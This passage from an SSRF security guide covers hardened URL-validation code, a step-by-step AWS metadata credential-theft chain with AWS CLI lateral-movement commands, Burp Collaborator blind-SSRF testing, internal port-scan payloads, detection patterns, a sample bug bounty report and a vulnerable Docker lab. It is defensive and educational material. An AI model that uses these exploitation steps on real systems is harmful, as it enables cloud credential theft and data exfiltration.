    if parsed.username or parsed.password:
        raise HTTPException(status_code=400, detail="URLs with credentials not allowed")

    hostname = parsed.hostname
    if not hostname:
        raise HTTPException(status_code=400, detail="No hostname in URL")

    # Check if hostname is a raw IP
    try:
        ip = ipaddress.ip_address(hostname)
        if is_blocked_ip(str(ip)):
            raise HTTPException(status_code=400, detail="Blocked IP address")
        return {"resolved_ip": str(ip), "hostname": hostname}
    except ValueError:
        pass  # Not a raw IP, proceed to DNS resolution

    # Resolve DNS
    try:
        addresses = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        ips = list(set(addr[4][0] for addr in addresses))
    except socket.gaierror:
        raise HTTPException(status_code=400, detail="DNS resolution failed")

    if not ips:
        raise HTTPException(status_code=400, detail="No DNS results")

    # Check all resolved IPs
    for ip in ips:
        if is_blocked_ip(ip):
            raise HTTPException(
                status_code=400,
                detail=f"Hostname resolves to blocked IP"
            )

    return {"resolved_ip": ips[0], "hostname": hostname}


class FetchRequest(BaseModel):
    url: str


class WebhookRequest(BaseModel):
    webhookUrl: str
    event: str


@app.post("/api/fetch-url")
async def fetch_url(data: FetchRequest):
    # Validate and resolve URL
    validated = validate_url(data.url)

    # Build request to resolved IP to prevent DNS rebinding
    parsed = urlparse(data.url)
    resolved_url = parsed._replace(netloc=validated["resolved_ip"]).geturl()

    try:
        async with httpx.AsyncClient(
            timeout=5.0,
            follow_redirects=False,    # Block redirect-based bypass
            max_redirects=0
        ) as client:
            response = await client.get(
                resolved_url,
                headers={"Host": validated["hostname"]}
            )
    except httpx.TimeoutException:
        raise HTTPException(status_code=504, detail="Request timed out")
    except Exception as e:
        raise HTTPException(status_code=502, detail="Request failed")

    # Limit response size
    body = response.text[:10000]

    return {
        "status": response.status_code,
        "content_type": response.headers.get("content-type"),
        "body": body
    }


@app.post("/api/webhooks/register")
async def register_webhook(data: WebhookRequest):
    # Validate webhook URL at registration time
    if not data.webhookUrl.startswith("https://"):
        raise HTTPException(status_code=400, detail="Webhook must use HTTPS")

    validate_url(data.webhookUrl)

    # Store webhook (validate again at delivery time)
    # await db.webhooks.create(url=data.webhookUrl, event=data.event)

    return {"message": "Webhook registered"}


@app.post("/api/webhooks/deliver")
async def deliver_webhook(webhook_id: str):
    """Called internally when an event fires. Re-validates URL before delivery."""
    # webhook = await db.webhooks.get(webhook_id)
    # Simulated:
    webhook_url = "https://example.com/hook"  # From database

    # Re-validate at delivery time (URL could have been registered before
    # a DNS record change pointed it to an internal IP)
    validate_url(webhook_url)

    async with httpx.AsyncClient(
        timeout=5.0,
        follow_redirects=False
    ) as client:
        validated = validate_url(webhook_url)
        parsed = urlparse(webhook_url)
        resolved_url = parsed._replace(netloc=validated["resolved_ip"]).geturl()

        await client.post(
            resolved_url,
            json={"event": "test", "data": {}},
            headers={"Host": validated["hostname"]}
        )

    return {"status": "delivered"}
```

---

## AWS-Specific SSRF Exploitation and IAM Role Credential Theft

### Full Exploitation Chain

**Step 1: Confirm SSRF exists:**

```json
{
  "url": "http://169.254.169.254/latest/meta-data/instance-id"
}
```

If the response contains something like `i-0abc123def456789`, you have confirmed SSRF and the target is running on AWS EC2.

**Step 2: Enumerate the instance:**

```json
{"url": "http://169.254.169.254/latest/meta-data/ami-id"}
{"url": "http://169.254.169.254/latest/meta-data/instance-type"}
{"url": "http://169.254.169.254/latest/meta-data/placement/availability-zone"}
{"url": "http://169.254.169.254/latest/meta-data/local-ipv4"}
{"url": "http://169.254.169.254/latest/meta-data/public-ipv4"}
{"url": "http://169.254.169.254/latest/meta-data/security-groups"}
```

**Step 3: Get IAM role credentials:**

```json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

Response: `app-production-role`

```json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role"}
```

Response:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIAZ3EXAMPLE...",
  "SecretAccessKey": "SECRET...",
  "Token": "TOKEN...",
  "Expiration": "2025-03-15T18:00:00Z"
}
```

**Step 4: Use stolen credentials for lateral movement:**

```bash
# Configure AWS CLI with stolen credentials
export AWS_ACCESS_KEY_ID="ASIAZ3EXAMPLE..."
export AWS_SECRET_ACCESS_KEY="SECRET..."
export AWS_SESSION_TOKEN="TOKEN..."
export AWS_DEFAULT_REGION="us-east-1"

# Discover what the role can do
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name app-production-role

# Common high-value targets:
aws s3 ls                                          # List all buckets
aws s3 ls s3://company-backups/ --recursive        # Browse backup bucket
aws secretsmanager list-secrets                    # Find secrets
aws secretsmanager get-secret-value --secret-id db-credentials
aws dynamodb list-tables                           # List DynamoDB tables
aws dynamodb scan --table-name users               # Dump user table
aws rds describe-db-instances                      # Find RDS instances
aws ec2 describe-instances                         # Map infrastructure
aws lambda list-functions                          # List Lambda functions
aws lambda get-function --function-name admin-api  # Download Lambda code
```

**Step 5: Access user data:**

```json
{"url": "http://169.254.169.254/latest/user-data"}
```

User data often contains bootstrap scripts with hardcoded secrets:

```bash
#!/bin/bash
export DB_HOST=rds-prod.cluster-abc123.us-east-1.rds.amazonaws.com
export DB_USER=admin
export DB_PASS=SuperSecretProdPassword123!
export REDIS_URL=redis://prod-redis.abc123.ng.0001.use1.cache.amazonaws.com:6379
export API_SECRET_KEY=sk_live_abc123def456ghi789
```

### AWS Prevention Strategies

**1. Enforce IMDSv2:**

```bash
# For all instances in the account
for instance_id in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text); do
  aws ec2 modify-instance-metadata-options \
    --instance-id $instance_id \
    --http-tokens required \
    --http-put-response-hop-limit 1
done
```

**2. Least-privilege IAM roles:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-app-uploads/*"
    }
  ]
}
```

Do not attach `AdministratorAccess`, `PowerUserAccess`, or broad wildcard policies to EC2 instance roles. The role should have the minimum permissions needed for the application to function.

**3. VPC Endpoint Policies:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-app-uploads/*"
    },
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:ResourceAccount": "123456789012"
        }
      }
    }
  ]
}
```

**4. Security Groups for metadata access:**

```bash
# Block metadata access at the network level for containers
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

For ECS tasks, use `awsvpc` networking mode with task role credentials instead of EC2 instance role credentials.

---

## Burp Suite Collaborator Workflow for Blind SSRF

### Step-by-Step Methodology

**Step 1: Identify injection points.**

Look for any parameter, header, or body field that accepts a URL or hostname:
- `url`, `uri`, `href`, `src`, `link`, `callback`, `redirect`, `webhook`
- `imageUrl`, `avatarUrl`, `iconUrl`, `logoUrl`
- `endpoint`, `host`, `target`, `domain`
- XML content with external entities or `xlink:href`
- PDF generation endpoints that accept HTML

**Step 2: Generate unique Collaborator payloads.**

In Burp Suite Professional, open Collaborator and generate multiple unique subdomains. Each injection point gets a unique subdomain so you can correlate which parameter triggered the interaction.

```
param-url.abc123.burpcollaborator.net
param-webhook.def456.burpcollaborator.net
param-image.ghi789.burpcollaborator.net
header-referer.jkl012.burpcollaborator.net
```

**Step 3: Inject payloads into every potential vector.**

```http
POST /api/settings HTTP/1.1
Host: app.target.com
Content-Type: application/json

{
  "profileUrl": "http://param-url.abc123.burpcollaborator.net/",
  "webhookUrl": "http://param-webhook.def456.burpcollaborator.net/callback",
  "avatarUrl": "http://param-image.ghi789.burpcollaborator.net/avatar.png"
}
```

Also test in headers:

```http
GET /api/data HTTP/1.1
Host: app.target.com
Referer: http://header-referer.jkl012.burpcollaborator.net/
X-Forwarded-For: http://header-xff.mno345.burpcollaborator.net/
```

**Step 4: Poll Collaborator for interactions.**

Click "Poll now" in the Collaborator tab. Look for:
- **DNS interactions:** The server resolved your Collaborator hostname. Confirms outbound DNS. Likely SSRF or SSRF-adjacent behavior.
- **HTTP interactions:** The server made an HTTP request to your Collaborator. Confirms SSRF. Check the request details for the server's IP, User-Agent, and any custom headers.

**Step 5: Escalate confirmed SSRF.**

Once you have confirmed which parameter triggers the outbound request:

1. Test internal IP access: `http://127.0.0.1/`, `http://169.254.169.254/`
2. Test scheme handling: `file:///etc/passwd`, `gopher://`, `dict://`
3. Test redirect following: Point to your server that redirects to internal URLs
4. Test response reflection: Can you read the response content?

**Step 6: Automate with Burp Intruder.**

Load a list of internal IPs and ports into Intruder. Use the SSRF vector as the injection point:

```
http://10.0.0.FUZZ:PORT/
```

Payload set 1 (FUZZ): `1-255`
Payload set 2 (PORT): `22, 80, 443, 3000, 3306, 5432, 6379, 8080, 8443, 9200, 27017`

Analyze response times and sizes to identify live internal hosts and open ports.

---

## Common Developer Mistakes

| Mistake | Impact | Fix |
|---------|--------|-----|
| No URL validation on user input | Full SSRF | Validate scheme, resolve DNS, check IP ranges |
| Following redirects | SSRF filter bypass | Disable redirects or re-validate after each redirect |
| Checking hostname but not resolved IP | DNS rebinding bypass | Resolve DNS, validate IP, connect to resolved IP directly |
| Allowing `file://` scheme | Local file read | Whitelist `http://` and `https://` only |
| IMDSv1 enabled on EC2 instances | Credential theft via metadata | Enforce IMDSv2 with `http-tokens: required` |
| Over-privileged IAM roles | Full AWS account compromise from SSRF | Apply least-privilege IAM policies |
| Trusting IP blocklist alone | IP encoding bypass | Use proper IP parsing library, normalize before checking |
| Validating URL at registration but not delivery | Time-of-check-time-of-use bypass | Re-validate at every request time |
| Exposing error messages | Internal service discovery | Return generic errors, log details server-side |
| Not restricting response size | Memory exhaustion, data exfiltration | Limit response body size and timeout |

---

## Detection Strategies

### Application-Level Detection

```python
import logging
import ipaddress

logger = logging.getLogger("ssrf_monitor")

INTERNAL_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def detect_ssrf_attempt(url: str, resolved_ip: str, user_id: str):
    """Log and alert on potential SSRF attempts."""
    ip = ipaddress.ip_address(resolved_ip)

    for network in INTERNAL_RANGES:
        if ip in network:
            logger.critical(
                f"SSRF ATTEMPT DETECTED: user={user_id} "
                f"url={url} resolved_ip={resolved_ip}"
            )
            # Trigger security alert
            # send_alert_to_security_team(...)
            return True

    # Also detect metadata endpoints
    suspicious_patterns = [
        "169.254.169.254",
        "metadata.google.internal",
        "metadata.azure.com",
        "100.100.100.200",  # Alibaba Cloud metadata
    ]

    for pattern in suspicious_patterns:
        if pattern in url:
            logger.critical(
                f"CLOUD METADATA ACCESS ATTEMPT: user={user_id} url={url}"
            )
            return True

    return False
```

### Network-Level Detection

```bash
# Monitor outbound connections from web servers to metadata endpoints
# iptables logging rule
iptables -A OUTPUT -d 169.254.169.254 -j LOG --log-prefix "SSRF_METADATA_ACCESS: "

# AWS VPC Flow Logs
# Enable flow logs and alert on traffic to 169.254.169.254 from application subnets

# CloudWatch Metric Filter for metadata access in VPC Flow Logs
# Pattern: [version, account, eni, source, destination="169.254.169.254", ...]
```

### AWS CloudTrail Detection

If credentials are stolen via SSRF, the attacker will use them from outside your network. CloudTrail logs will show:

1. API calls from an IP address that is not your EC2 instance
2. API calls from a geographic region where you do not operate
3. Unusual API actions for the role (e.g., a web server role suddenly calling `iam:ListUsers`)

```json
{
  "eventSource": "sts.amazonaws.com",
  "eventName": "GetCallerIdentity",
  "sourceIPAddress": "203.0.113.50",
  "userAgent": "aws-cli/2.0.0",
  "userIdentity": {
    "type": "AssumedRole",
    "arn": "arn:aws:sts::123456789012:assumed-role/app-production-role/i-0abc123"
  }
}
```

If `sourceIPAddress` is not the instance's IP, the credentials have been stolen.

---

## Bug Bounty Report Example

**Title:** Blind SSRF in Webhook Configuration Allowing AWS IAM Credential Theft via IMDS

**Severity:** Critical (CVSS 9.8)

**Affected Endpoint:** `POST /api/v2/integrations/webhooks`

**Summary:**

The webhook configuration endpoint accepts a user-supplied URL without server-side validation. When the configured event fires, the server makes an HTTP request to the specified URL. By setting the webhook URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`, an attacker can steal AWS IAM role credentials attached to the EC2 instance.

**Steps to Reproduce:**

1. Authenticate as any user with webhook configuration permission.
2. Create a webhook with the following configuration:

```http
POST /api/v2/integrations/webhooks HTTP/1.1
Host: app.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "name": "Test Webhook",
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "events": ["user.created"],
  "active": true
}
```

3. Response: `201 Created` -- webhook registered successfully.
4. Trigger the event (create a new user, or wait for a natural event).
5. The webhook delivery log at `GET /api/v2/integrations/webhooks/<id>/deliveries` shows the response from the metadata endpoint:

```json
{
  "delivery_id": "d-abc123",
  "response_status": 200,
  "response_body": "app-production-role"
}
```

6. Update the webhook URL to include the role name:

```json
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role"
}
```

7. Trigger the event again. The delivery log now contains:

```json
{
  "response_body": "{\"Code\":\"Success\",\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\"}"
}
```

8. Use the stolen credentials:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls  # Lists all S3 buckets in the account
```

**Impact:**

The IAM role `app-production-role` has access to:
- All S3 buckets (including customer data backups)
- DynamoDB tables containing user data
- Secrets Manager secrets including database credentials
- Full EC2 describe access (infrastructure mapping)

This SSRF allows complete compromise of the AWS environment accessible to this role. The attacker can exfiltrate customer data, modify infrastructure, and potentially pivot to additional AWS services.

**Recommendation:**

1. **Immediate:** Enforce IMDSv2 on all EC2 instances (`--http-tokens required`).
2. **Short-term:** Implement URL validation on the webhook endpoint:
   - Block private IP ranges, loopback, and link-local addresses
   - Resolve DNS server-side and validate the resolved IP
   - Block `file://`, `gopher://`, `dict://` and other non-HTTP schemes
   - Do not follow redirects (or re-validate after each redirect)
3. **Medium-term:** Apply least-privilege IAM policies to the instance role.
4. **Long-term:** Implement egress filtering at the network level. The application server should only be able to reach the internet through a proxy that blocks internal destinations.

---

## Severity Explanation

SSRF severity varies based on what is reachable and whether responses are returned:

- **Low (1.0-3.9):** Blind SSRF with no way to read responses, limited to confirming the vulnerability exists. No internal service interaction beyond the initial request.
- **Medium (4.0-6.9):** Blind SSRF that can trigger actions on internal services (e.g., cache flush, queue message). Port scanning capability. SSRF with response that reveals limited internal information.
- **High (7.0-8.9):** SSRF with response that reveals sensitive internal data (internal pages, configuration, application source code). Access to internal admin panels.
- **Critical (9.0-10.0):** SSRF that exposes cloud credentials (AWS/GCP/Azure IAM tokens), enables local file read of secrets, allows RCE through internal services (Redis, Jenkins), or enables full internal network pivoting. The Capital One breach SSRF would be a CVSS 10.0.

The critical factor is what the attacker can reach and what the reachable services expose. An SSRF that hits the AWS metadata endpoint on an instance with `AdministratorAccess` is a full account compromise. The same SSRF on an instance with no IAM role is significantly less impactful.

---

## Lab Setup Ideas

### Docker Compose: Vulnerable SSRF Environment

```yaml
version: '3.8'

services:
  # Vulnerable web application
  web:
    build: ./vulnerable-app
    ports:
      - "8080:3000"
    environment:
      - REDIS_URL=redis://redis:6379
      - ELASTICSEARCH_URL=http://elasticsearch:9200
    networks:
      - internal

  # Internal Redis (no auth)
  redis:
    image: redis:7-alpine
    networks:
      - internal

  # Internal Elasticsearch (no auth)
  elasticsearch:
    image: elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    networks:
      - internal

  # Simulated AWS metadata endpoint
  metadata:
    build: ./fake-metadata
    networks:
      internal:
        ipv4_address: 169.254.169.254  # Requires custom network config
    # Alternative: Run on a different IP and configure the app to treat it as metadata

  # Internal admin panel
  admin:
    image: nginx:alpine
    volumes:
      - ./admin-panel:/usr/share/nginx/html
    networks:
      - internal

networks:
  internal:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16
```

**fake-metadata/server.js:**

```javascript
const express = require('express');
const app = express();

const ROLE_NAME = 'app-production-role';

const metadata = {
  '/latest/meta-data/': 'ami-id\nami-launch-index\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\npublic-ipv4\nsecurity-groups',
  '/latest/meta-data/instance-id': 'i-0abc123def456789',
  '/latest/meta-data/instance-type': 't3.medium',
  '/latest/meta-data/local-ipv4': '10.0.1.100',
  '/latest/meta-data/iam/security-credentials/': ROLE_NAME,
  [`/latest/meta-data/iam/security-credentials/${ROLE_NAME}`]: JSON.stringify({
    Code: 'Success',
    AccessKeyId: 'ASIAIOSFODNN7EXAMPLE',
    SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    Token: 'FwoGZXIvYXdzEBAaDFAKETOKENEXAMPLE...',
    Expiration: new Date(Date.now() + 6 * 3600 * 1000).toISOString()
  }),
  '/latest/user-data': '#!/bin/bash\nexport DB_HOST=rds-prod.cluster-abc123.us-east-1.rds.amazonaws.com\nexport DB_PASS=SuperSecretProdPassword123!\nexport API_KEY=sk_live_fake_key_for_lab'
};

app.get('*', (req, res) => {
  const path = req.path;
  if (metadata[path]) {
    res.type('text/plain').send(metadata[path]);
  } else {
    res.status(404).send('Not Found');
  }
});

app.listen(80, () => console.log('Fake IMDS running on port 80'));
```

### Lab Exercises

1. **Basic SSRF:** Use the fetch URL endpoint to read the internal admin panel.
2. **Metadata theft:** Steal IAM credentials from the simulated metadata endpoint.
3. **Internal port scan:** Map all running services on the internal network.
4. **Redis exploitation:** Use SSRF to interact with the unprotected Redis instance.
5. **Elasticsearch data exfiltration:** Read sensitive indices from the internal Elasticsearch cluster.
6. **Blind SSRF:** Modify the app to not return responses. Detect SSRF using timing analysis and out-of-band techniques.
7. **Filter bypass:** Add an IP blocklist to the app and practice bypassing it with IP encoding, DNS rebinding, and redirects.
8. **Full chain:** Steal metadata credentials, use them to access S3 (simulated), and exfiltrate data.

### Recommended Platforms

- **PortSwigger Web Security Academy:** Multiple SSRF labs from basic to expert
- **HackTheBox:** Machines with SSRF as the initial foothold
- **TryHackMe:** Dedicated SSRF rooms with guided walkthroughs
- **PentesterLab:** SSRF-specific exercises including cloud metadata exploitation
- **CloudGoat (by Rhino Security Labs):** AWS-specific SSRF and credential theft scenarios

---

## Conclusion

SSRF is not just a vulnerability -- it is a pivot point. A single SSRF bug in a cloud-hosted application can escalate from "the server makes an HTTP request" to "the attacker has AWS administrator credentials and full access to every database, every secret, and every piece of infrastructure in the account."

The defense strategy must be layered:

1. **Input validation:** Whitelist allowed schemes. Resolve DNS server-side and validate the resolved IP against a blocklist of internal ranges. Reject private, loopback, and link-local addresses.
2. **DNS rebinding prevention:** Connect to the resolved IP directly, not the hostname. Eliminate the TOCTOU gap between DNS resolution and HTTP connection.
3. **Redirect handling:** Do not follow redirects, or re-validate after each redirect hop.
4. **Cloud hardening:** Enforce IMDSv2 on all EC2 instances. Apply least-privilege IAM policies. Use VPC endpoints with restrictive policies.
5. **Network segmentation:** The web application should not be able to reach every internal service. Use security groups, network ACLs, and egress filtering to limit what the application server can connect to.
6. **Response handling:** Even if you must make outbound requests, do not return the full response to the user. Parse and sanitize the response server-side.
7. **Monitoring:** Alert on outbound connections to metadata endpoints, internal IP ranges, and unusual ports. Monitor CloudTrail for credential usage from unexpected source IPs.

Every feature that makes an HTTP request based on user input is a potential SSRF vector. Webhooks, URL previews, PDF generators, image importers, RSS feed readers, oEmbed endpoints, and API integration connectors all share the same fundamental risk. Audit every one of them with the methodology described in this guide, and test them with Burp Collaborator to catch the blind cases that do not reveal themselves through normal testing.
